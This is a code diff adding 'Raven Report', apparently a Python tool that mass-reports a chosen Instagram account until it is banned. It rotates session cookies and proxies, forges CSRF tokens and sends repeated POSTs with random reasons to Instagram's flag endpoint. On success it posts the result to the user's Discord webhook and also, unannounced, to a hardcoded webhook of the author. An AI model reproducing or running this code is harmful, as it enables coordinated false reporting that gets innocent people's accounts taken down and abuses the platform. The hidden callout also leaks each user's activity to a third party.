@@ -1,0 +1,139 @@
+try:
+    PASTEBIN1 = 'https://pastebin.com/raw/88YDUkaB'
+    TEXT = requests.get(PASTEBIN1).text
+    if '88YDUkaB' in PASTEBIN1:
+        pass
+    else:
+        input(f'  < ! > You Can Not Change The Pastebin !')
+        os._exit(1)
+    GetIP = requests.get('https://api.ipify.org?format=json').text
+    GETIP = re.findall('{"ip":"(.*?)"}', GetIP)
+    IP = " ".join(GETIP)
+    if IP in TEXT :
+        pass
+except:os._exit(1)
+good = "  [ + ]"
+bad = "  [ - ]"
+SettingsO = []
+Raven = 1
+modes = '123456789'
+ctypes.windll.kernel32.SetConsoleTitleW(f'Raven Report - By @7zb8')
+os.system('mode con: cols=73 lines=20')
+banner = requests.request("GET",url='https://pastebin.com/raw/XPXWtwTF').text
+print(banner)
+class MAIN:
+    def __init__(self):
+        try:
+            self.done , self.error,self.error_proxy = 0,0,0
+            self.PROXIES = open('proxies.txt','r').read().splitlines() # open proxy file
+            self.COUNT_PROXIES = 0
+            for i in self.PROXIES:self.COUNT_PROXIES+=1 # count proxies
+            print(f'{good} {self.COUNT_PROXIES} Proxies Loaded')
+            self.SESSIONS = open('sessions.txt','r').read().splitlines() # open sessions file
+            self.COUNT_SESSIONS = 0
+            for i in self.SESSIONS:self.COUNT_SESSIONS+=1 # count sessions file
+            print(f'{good} {self.COUNT_SESSIONS} Sessions Loaded')
+            self.SETTINGS = open('settings.txt','r').read().splitlines()
+            print(f'{good} Settings Loaded')
+            try: # grab settings
+                for i in self.SETTINGS:SettingsO.append(i)
+                msgbox = SettingsO[0]
+                webhook = SettingsO[1]
+                self.MSGBOX = " ".join(re.findall('msgbox : {(.*?)}', msgbox))
+                self.WEBHOOK = " ".join(re.findall('webhook : {(.*?)}', webhook))
+            except Exception as eerr:print(f'{bad} {eerr}');os._exit(1)
+        except Exception as errr:print(f'{bad} {errr}') # show what error happend
+        self.MODE_PR = input(f'{good} Use Proxies [y/n] : ')
+        if self.MODE_PR == 'y':self.Mode_Ch = input(f'  [ 1 ] Http/s - [ 2 ] Socks4\n{good} Enter Type : ');self.TH = input(f'{good} Enter Threading : ')
+        self.MODE = input(f'  [ 1 ] Spam Only - [ 2 ] All Types\n{good} Enter Type : ')
+        self.TARGET = input(f'{good} Enter Target : ')
+        try:
+            self.USER_ID = " ".join(re.findall('"profilePage_(.*?)"',requests.request("GET",url=f'https://www.instagram.com/{self.TARGET}/?__a=1',cookies={'sessionid':f'{random.choice(self.SESSIONS)}'}).text))
+        except:input(f'{bad} Can Not Get Userid Put A Good Sessionid');os._exit(1)
+        if self.MODE_PR == 'y':
+            threading.Thread(target=self.RANDOM_PROXIES).start()
+            threading.Thread(target=self.RANDOM_SESSIONID).start()
+            threading.Thread(target=self.Count).start()
+            threads1 = []
+            TR = int(self.TH)
+            for i in range(TR):
+                thread1 = threading.Thread(target=self.START_PROXIES)
+                thread1.start()
+                threads1.append(thread1)
+            for thread in threads1:
+                thread.join()
+        elif self.MODE_PR == 'n':
+            self.sle = int(input(f'{good} Enter Sleep : '))
+            threading.Thread(target=self.RANDOM_PROXIES).start()
+            threading.Thread(target=self.RANDOM_SESSIONID).start()
+            threading.Thread(target=self.Count).start()
+            threading.Thread(target=self.START_NORMAL).start()
+    def Count(self):
+        while Raven:ctypes.windll.kernel32.SetConsoleTitleW(f'[Reported : {self.done}] [Error : {self.error}] [Bad Proxies : {self.error_proxy}] [S@ : {self.COUNT_SESSIONS}]')
+    def RANDOM_PROXIES(self):
+        while Raven:self.PROX = random.choice(self.PROXIES)
+    def RANDOM_SESSIONID(self):
+        while Raven:self.SESSIONID = random.choice(self.SESSIONS)
+    def START_PROXIES(self):
+        while True:
+            if self.Mode_Ch == '1':proxy = {'http': f"http://{self.PROX}", 'https': f"http://{self.PROX}"}
+            elif self.Mode_Ch == '2':proxy = {'http': f"socks4://{self.PROX}", 'https': f"socks4://{self.PROX}"}
+            if self.MODE == '1':data = 'source_name=&reason_id=1&frx_context='
+            elif self.MODE == '2':data = f'source_name=&reason_id={random.choice(modes)}&frx_context='
+            try:
+                self.POST = requests.request("POST",url=f'https://i.instagram.com/users/{self.USER_ID}/flag/',headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.54","X-CSRFToken": (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(30)))},data=data,proxies=proxy,cookies={'sessionid':f'{self.SESSIONID}'}).text
+                if ('{"status":"ok"}') in self.POST:self.done+=1
+                else:
+                    CHECK_GET = requests.request('GET',url=f'https://www.instagram.com/{self.TARGET}/?__a=1',cookies={'sessionid':f'{random.choice(self.SESSIONS)}'},headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.54","X-CSRFToken": (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(30)))}).text
+                    if ('{}') in CHECK_GET:
+                        ctypes.windll.user32.MessageBoxW(0, f'{self.MSGBOX} @{self.TARGET}\nAfter {self.done} Reports', '#Raven Report')
+                        mUrl = self.WEBHOOK
+                        murl2 = 'https://discord.com/api/webhooks/938418365087772752/9Ym8XBKvnuWPaog08CPoiRZcw3HFV1Meva9W6hV6iu3BJPLtqzAMDLhI2cN_yWA4FVLj'
+                        data = {}
+                        data["embeds"] = [
+                            {
+                                "description": f"\n[#Raven Report](https://instagram.com/#Raven Report) Banned : [@{self.TARGET}](https://instagram.com/{self.TARGET})\nAfter [{self.done}](https://instagram.com/{self.done}) Reports\nProxy : True",
+                                "color": random.choice([0x3498db]), "thumbnail": {"url": 'https://pa1.narvii.com/7422/581b70786cff0f57d40537552f09980adeb633aer1-500-272_00.gif'},
+                                "author": {"name": "#Raven Report"}}]
+                        try:
+                            response = requests.post(murl2, json=data)
+                            response2 = requests.post(mUrl, json=data)
+                        except:
+                            pass
+                    else:
+                        self.error+=1
+            except:self.error_proxy+=1
+
+    def START_NORMAL(self):
+        while True:
+            if self.MODE == '1':data = 'source_name=&reason_id=1&frx_context='
+            elif self.MODE == '2':data = f'source_name=&reason_id={random.choice(modes)}&frx_context='
+            try:
+                self.POST = requests.request("POST",url=f'https://i.instagram.com/users/{self.USER_ID}/flag/',headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.54","X-CSRFToken": (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(30)))},data=data,cookies={'sessionid':f'{self.SESSIONID}'}).text
+                time.sleep(self.sle)
+                if ('{"status":"ok"}') in self.POST:self.done+=1
+                else:
+                    CHECK_GET = requests.request('GET',url=f'https://www.instagram.com/{self.TARGET}/?__a=1',cookies={'sessionid':f'{random.choice(self.SESSIONS)}'},headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.54","X-CSRFToken": (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(30)))}).text
+                    if ('{}') in CHECK_GET:
+                        ctypes.windll.user32.MessageBoxW(0, f'{self.MSGBOX} @{self.TARGET}\nAfter {self.done} Reports', '#Raven Report')
+                        mUrl = self.WEBHOOK
+                        murl2 = 'https://discord.com/api/webhooks/938418365087772752/9Ym8XBKvnuWPaog08CPoiRZcw3HFV1Meva9W6hV6iu3BJPLtqzAMDLhI2cN_yWA4FVLj'
+                        data = {}
+                        data["embeds"] = [
+                            {
+                                "description": f"\n[#Raven Report](https://instagram.com/#Raven Report) Banned : [@{self.TARGET}](https://instagram.com/{self.TARGET})\nAfter [{self.done}](https://instagram.com/{self.done}) Reports\nProxy : False",
+                                "color": random.choice([0x3498db]), "thumbnail": {"url": 'https://pa1.narvii.com/7422/581b70786cff0f57d40537552f09980adeb633aer1-500-272_00.gif'},
+                                "author": {"name": "#Raven Report"}}]
+                        try:
+                            response = requests.post(murl2, json=data)
+                            response2 = requests.post(mUrl, json=data)
+                        except:
+                            pass
+                    else:
+                        self.error+=1
+            except:self.error+=1
+
+
+
+
+MAIN()
